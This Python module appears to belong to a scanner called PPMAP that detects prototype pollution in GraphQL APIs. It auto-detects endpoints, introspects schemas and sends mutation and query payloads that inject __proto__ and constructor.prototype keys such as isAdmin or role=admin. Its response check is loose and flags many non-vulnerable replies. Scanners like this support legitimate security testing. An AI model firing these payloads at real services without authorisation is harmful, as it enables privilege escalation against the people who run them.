"""
GraphQL Prototype Pollution Scanner for PPMAP v5.0
Detect PP vulnerabilities in GraphQL mutations and queries.
"""

import json
import logging
import requests
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)


@dataclass
class GraphQLFinding:
    """GraphQL PP vulnerability finding."""

    endpoint: str
    operation_type: str  # 'mutation' or 'query'
    operation_name: str
    payload: str
    response: Dict[str, Any]
    severity: str = "HIGH"
    verified: bool = False
    evidence: Dict[str, Any] = field(default_factory=dict)


# GraphQL Proto Pollution Payloads
GRAPHQL_PP_PAYLOADS = {
    "mutation_injection": [
        # Direct __proto__ in input
        {
            "query": """mutation TestPP($input: JSON) {
                updateSettings(input: $input) { success }
            }""",
            "variables": {"input": {"__proto__": {"isAdmin": True}}},
        },
        {
            "query": """mutation UpdateUser($data: UserInput!) {
                updateUser(data: $data) { id name }
            }""",
            "variables": {"data": {"name": "test", "__proto__": {"role": "admin"}}},
        },
        # Constructor prototype
        {
            "query": """mutation SetConfig($config: JSON) {
                setConfig(config: $config) { status }
            }""",
            "variables": {"config": {"constructor": {"prototype": {"polluted": True}}}},
        },
    ],
    "query_injection": [
        # Filter parameter pollution
        {
            "query": """query GetUsers($filter: JSON) {
                users(filter: $filter) { id email }
            }""",
            "variables": {"filter": {"__proto__": {"isAdmin": True}}},
        },
        # Nested object pollution
        {
            "query": """query Search($options: SearchOptions) {
                search(options: $options) { results }
            }""",
            "variables": {"options": {"query": "test", "__proto__": {"bypass": True}}},
        },
    ],
    "introspection_abuse": [
        # Check if server reflects __proto__ in response
        {
            "query": """query {
                __schema { types { name } }
            }""",
            "variables": {},
        },
    ],
}


class GraphQLScanner:
    """
    Scanner for GraphQL prototype pollution vulnerabilities.

    Features:
    - Auto-detect GraphQL endpoints
    - Schema introspection
    - Mutation and query injection testing
    - Custom payload support
    """

    COMMON_ENDPOINTS = [
        "/graphql",
        "/api/graphql",
        "/v1/graphql",
        "/api/v1/graphql",
        "/query",
        "/gql",
    ]

    def __init__(
        self,
        timeout: int = 15,
        headers: Optional[Dict[str, str]] = None,
        verify_ssl: bool = False,
    ):
        """
        Initialize GraphQL scanner.

        Args:
            timeout: Request timeout in seconds
            headers: Custom headers for requests
            verify_ssl: Verify SSL certificates
        """
        self.timeout = timeout
        self.headers = headers or {
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def detect_graphql_endpoint(self, base_url: str) -> Optional[str]:
        """
        Auto-detect GraphQL endpoint.

        Args:
            base_url: Base URL to probe

        Returns:
            GraphQL endpoint URL if found, None otherwise
        """
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        introspection_query = {"query": "{ __typename }"}

        for endpoint in self.COMMON_ENDPOINTS:
            url = urljoin(base, endpoint)
            try:
                resp = self.session.post(
                    url,
                    json=introspection_query,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )

                if resp.status_code == 200:
                    data = resp.json()
                    if "data" in data or "errors" in data:
                        logger.info(f"GraphQL endpoint found: {url}")
                        return url

            except Exception as e:
                logger.debug(f"Probe failed for {url}: {e}")
                continue

        # Try original URL as GraphQL endpoint
        try:
            resp = self.session.post(
                base_url,
                json=introspection_query,
                timeout=self.timeout,
                verify=self.verify_ssl,
            )
            if resp.status_code == 200:
                data = resp.json()
                if "data" in data:
                    return base_url
        except:
            pass

        return None

    def introspect_schema(self, endpoint: str) -> Optional[Dict]:
        """
        Perform GraphQL schema introspection.

        Args:
            endpoint: GraphQL endpoint URL

        Returns:
            Schema dict if successful, None otherwise
        """
        introspection_query = {"query": """
            query IntrospectionQuery {
                __schema {
                    types {
                        name
                        kind
                        fields {
                            name
                            type { name kind }
                            args { name type { name } }
                        }
                    }
                    mutationType { name }
                    queryType { name }
                }
            }
            """}

        try:
            resp = self.session.post(
                endpoint,
                json=introspection_query,
                timeout=self.timeout,
                verify=self.verify_ssl,
            )

            if resp.status_code == 200:
                data = resp.json()
                if "data" in data and "__schema" in data["data"]:
                    logger.info("Schema introspection successful")
                    return data["data"]["__schema"]

        except Exception as e:
            logger.warning(f"Schema introspection failed: {e}")

        return None

    def test_mutation_pp(
        self, endpoint: str, custom_payloads: Optional[List[Dict]] = None
    ) -> List[GraphQLFinding]:
        """
        Test GraphQL mutations for prototype pollution.

        Args:
            endpoint: GraphQL endpoint URL
            custom_payloads: Optional custom payloads to test

        Returns:
            List of findings
        """
        findings = []
        payloads = custom_payloads or GRAPHQL_PP_PAYLOADS["mutation_injection"]

        for payload in payloads:
            try:
                resp = self.session.post(
                    endpoint, json=payload, timeout=self.timeout, verify=self.verify_ssl
                )

                finding = self._analyze_response(endpoint, "mutation", payload, resp)
                if finding:
                    findings.append(finding)

            except Exception as e:
                logger.debug(f"Mutation test failed: {e}")

        return findings

    def test_query_pp(
        self, endpoint: str, custom_payloads: Optional[List[Dict]] = None
    ) -> List[GraphQLFinding]:
        """
        Test GraphQL queries for prototype pollution.

        Args:
            endpoint: GraphQL endpoint URL
            custom_payloads: Optional custom payloads to test

        Returns:
            List of findings
        """
        findings = []
        payloads = custom_payloads or GRAPHQL_PP_PAYLOADS["query_injection"]

        for payload in payloads:
            try:
                resp = self.session.post(
                    endpoint, json=payload, timeout=self.timeout, verify=self.verify_ssl
                )

                finding = self._analyze_response(endpoint, "query", payload, resp)
                if finding:
                    findings.append(finding)

            except Exception as e:
                logger.debug(f"Query test failed: {e}")

        return findings

    def _analyze_response(
        self, endpoint: str, op_type: str, payload: Dict, response: requests.Response
    ) -> Optional[GraphQLFinding]:
        """Analyze response for PP indicators."""
        try:
            data = response.json()
        except:
            return None

        # Check for pollution indicators in response
        response_str = json.dumps(data)

        indicators = [
            "isAdmin",
            "polluted",
            "role",
            "bypass",
            "__proto__",
            "constructor",
        ]

        for indicator in indicators:
            # Check if our injected value appears in response
            if indicator in response_str and "true" in response_str.lower():
                return GraphQLFinding(
                    endpoint=endpoint,
                    operation_type=op_type,
                    operation_name=payload.get("query", "")[:50],
                    payload=json.dumps(payload),
                    response=data,
                    severity="HIGH",
                    verified=False,
                    evidence={"indicator": indicator},
                )

        # Check for specific error patterns that suggest PP processing
        if "errors" in data:
            errors_str = json.dumps(data["errors"])
            if "__proto__" in errors_str or "prototype" in errors_str.lower():
                return GraphQLFinding(
                    endpoint=endpoint,
                    operation_type=op_type,
                    operation_name=payload.get("query", "")[:50],
                    payload=json.dumps(payload),
                    response=data,
                    severity="MEDIUM",
                    verified=False,
                    evidence={"error_reflection": True},
                )

        return None

    def scan_endpoint(self, url: str) -> List[GraphQLFinding]:
        """
        Perform full PP scan on a URL.

        Args:
            url: Target URL

        Returns:
            List of all findings
        """
        findings = []

        # Detect endpoint
        endpoint = self.detect_graphql_endpoint(url)
        if not endpoint:
            logger.info(f"No GraphQL endpoint found at {url}")
            return findings

        logger.info(f"Scanning GraphQL endpoint: {endpoint}")

        # Get schema
        schema = self.introspect_schema(endpoint)
        if schema:
            logger.info(f"Found {len(schema.get('types', []))} types in schema")

        # Test mutations
        mutation_findings = self.test_mutation_pp(endpoint)
        findings.extend(mutation_findings)

        # Test queries
        query_findings = self.test_query_pp(endpoint)
        findings.extend(query_findings)

        logger.info(f"GraphQL scan complete: {len(findings)} findings")
        return findings


def scan_graphql(url: str, **kwargs) -> List[Dict]:
    """
    Convenience function to scan a URL for GraphQL PP.

    Args:
        url: Target URL
        **kwargs: Additional options for GraphQLScanner

    Returns:
        List of findings as dicts
    """
    scanner = GraphQLScanner(**kwargs)
    findings = scanner.scan_endpoint(url)

    return [
        {
            "type": "graphql_pp",
            "endpoint": f.endpoint,
            "operation_type": f.operation_type,
            "operation_name": f.operation_name,
            "payload": f.payload,
            "severity": f.severity,
            "verified": f.verified,
            "evidence": f.evidence,
        }
        for f in findings
    ]
